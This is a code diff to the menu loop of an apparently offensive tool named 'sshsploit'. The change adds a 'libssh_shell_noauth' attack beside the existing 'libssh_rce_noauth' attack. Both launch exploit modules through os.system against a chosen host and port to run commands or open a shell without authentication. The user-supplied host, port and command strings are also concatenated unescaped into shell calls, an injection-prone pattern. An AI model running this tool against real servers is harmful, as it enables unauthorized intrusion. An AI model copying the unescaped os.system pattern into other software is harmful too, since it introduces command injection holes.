@@ -78,15 +78,17 @@ def main():
                 if rhost == "" or rport == "":
                     print(E+"Target is not specified!")
                 else:
-                    if cmd == "":
-                        print(E+"Command for RCE is not specified!")
-                    else:
-                        attack = ui[1]
-                        if attack == "libssh_rce_noauth":
+                    if ui[1] == "libssh_rce_noauth":
+                        if cmd == "":
+                            print(E+"Command for RCE is not specified!")
+                        else:
                             print(G+"Starting libssh_rce_noauth attack...")
                             os.system("python3 modules/libssh_rce_noauth.py "+rhost+" -p "+rport+" -v '"+cmd+"'")
-                        else:
-                            print(E+"No such attack!")
+                    elif ui[1] == "libssh_shell_noauth":
+                            print(G+"Starting libssh_shell_noauth attack...")
+                            os.system("python3 modules/libssh_shell_noauth.py "+rhost+" -p "+rport+" -v --shell")
+                    else:
+                        print(E+"No such attack!")
         else:
             print(E+"Unrecognized command!")
         ui = input('\033[4msshsploit\033[0m> ').strip(" ")
